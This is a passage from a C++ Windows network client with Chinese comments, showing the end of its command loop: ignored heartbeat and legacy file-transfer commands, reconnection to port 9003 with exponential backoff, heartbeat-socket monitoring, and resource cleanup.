                    else if (cmd == CMD_HEARTBEAT) {
                        // 忽略
                    }
                    else if (cmd == CMD_FILE_RESUME || cmd == CMD_FILE_BEGIN ||
                        cmd == CMD_FILE_CHUNK || cmd == CMD_FILE_END) {
                        // 旧协议忽略
                    }
                } // end while RecvPacketBin

                // 指令连接断了，2秒后重连9003
                // 指令连接断了，2秒后重连9003
                closesocket(cs);
                // ★ 新增：清除g_CmdSocket记录（连接已关闭）
                InterlockedExchange((LONG*)&g_CmdSocket, (LONG)INVALID_SOCKET);
                {
                    static volatile LONG s_backoffLevel = 0;
                    static volatile DWORD s_lastConnectTick = 0;
                    DWORD now = GetTickCount();
                    DWORD lastTick = (DWORD)InterlockedCompareExchange(
                        (LONG*)&s_lastConnectTick, 0, 0);

                    // 上次连接存活超过30秒，认为网络稳定，重置退避级别
                    if (now - lastTick > 30000)
                        InterlockedExchange(&s_backoffLevel, 0);

                    // 记录本次重连时间
                    InterlockedExchange((LONG*)&s_lastConnectTick, (LONG)GetTickCount());

                    // 计算等待时间：500ms * 2^level，上限8000ms
                    // 计算等待时间：500ms * 2^level，上限16000ms
                    LONG level = InterlockedCompareExchange(&s_backoffLevel, 0, 0);
                    int waitMs = 500;
                    for (LONG i = 0; i < level && waitMs < 16000; i++)
                        waitMs *= 2;
                    if (waitMs > 16000) waitMs = 16000;
                    // 递增退避级别，上限5（对应16秒），确保超过relay的KeepAlive检测时间（11秒）
                    if (level < 5)
                        InterlockedIncrement(&s_backoffLevel);
                    Sleep(waitMs);
                }
            } // end while hbRunning

            delete cp;
            return 0;
            }, cmdParam, 0, NULL);

        if (hCmdThread) CloseHandle(hCmdThread);

        // 等待心跳连接(s)断开
        // s只用于发心跳，服务器不会主动发数据过来
        // 用select检测连接是否断开
        // 等待心跳连接(s)断开
        while (true) {
            fd_set fd;
            FD_ZERO(&fd);
            FD_SET(s, &fd);
            timeval tv = { 0, 100000 };
            int selRet = select(0, &fd, NULL, NULL, &tv);
            if (selRet > 0) {
                char buf[1];
                int ret = recv(s, buf, 1, MSG_PEEK);
                if (ret <= 0) {
                    break;
                }
            }
            if (!hbRunning) break;  // ★ 心跳线程检测到发送失败，触发退出
            Sleep(100);
        }

        // 停止心跳线程
        hbRunning = false;
        WaitForSingleObject(hHbThread, 3000);
        CloseHandle(hHbThread);
        closesocket(s);

        hbRunning = true;  // ★ 新增：重置标志，供下次外层循环使用

        Sleep(RECONNECT_MS);
    }
    if (hNetMutex) CloseHandle(hNetMutex);
    WSACleanup();
    GdiplusShutdown(gdiplusToken);
    CloseHandle(hMutex);
    return 0;
}